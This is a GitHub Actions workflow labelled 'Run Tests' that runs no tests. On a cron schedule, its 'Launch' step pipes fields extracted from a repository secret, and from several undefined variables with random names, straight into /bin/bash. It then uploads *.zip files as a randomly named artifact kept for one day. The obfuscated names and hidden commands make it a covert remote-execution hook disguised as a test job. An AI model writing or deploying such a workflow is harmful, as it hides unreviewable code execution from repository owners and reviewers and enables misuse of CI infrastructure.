name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '47 3,9,15,21 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  handler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          lo0: ${{ secrets.lo0 }}
        run: |
          printf '%s' "$lo0" | jq -r .u6862 | /bin/bash
          printf '%s' "$aw4525" | jq -r .qx125 | /bin/bash
          printf '%s' "$kjk3" | jq -r .owhcl3037 | /bin/bash
          echo $dbvov8 | jq -r .cnwrp076 | /bin/bash
          echo $rvds19 | jq -r .wivc4 | /bin/bash

      - name: Persist output
        uses: actions/upload-artifact@v4
        with:
          name: dr5HhHQT
          path: "*.zip"
          retention-days: 1
